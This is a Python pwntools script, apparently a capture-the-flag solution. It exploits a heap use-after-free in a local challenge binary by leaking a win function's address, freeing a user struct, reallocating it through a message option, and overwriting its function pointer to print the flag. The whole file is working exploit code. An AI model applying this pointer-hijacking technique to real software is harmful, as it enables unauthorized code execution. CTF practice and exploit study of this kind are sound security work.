#!/usr/bin/env python3
from pwn import *

# load in the binary
elf = context.binary = ELF('./chal')
context.log_level = 'info'

def menu(choice: bytes):
    # waits for "stream!" prompt and then sends your choice
    p.sendlineafter(b'stream!', choice)

# start the process (or switch to remote())
p = process(elf.path)

# 1) Create an account (allocates the “user” struct on the heap)
menu(b'M')
p.sendlineafter(b'username:', b'test_user')

# 2) Leak the address of hahaexploitgobrrr via the subscribe (S) option
menu(b'S')
p.recvuntil(b'OOP! Memory leak...')
leak = int(p.recvline().strip(), 16)
log.success(f'Leaked hahaexploitgobrrr @ {hex(leak)}')

# 3) Free the “user” chunk by choosing “I” and confirming “Y”
menu(b'I')
p.sendlineafter(b'(Y/N)?', b'Y')

# 4) Reallocate that same freed 8-byte chunk via “leaveMessage” (L)
#    and overwrite the user->whatToDo pointer with the leaked address
menu(b'L')
p.send(p64(leak))

# as soon as leaveMessage returns, the main loop calls doProcess(user)
# which now jumps straight to hahaexploitgobrrr and prints the flag
flag = p.recvall(timeout=2)
print(flag.decode())
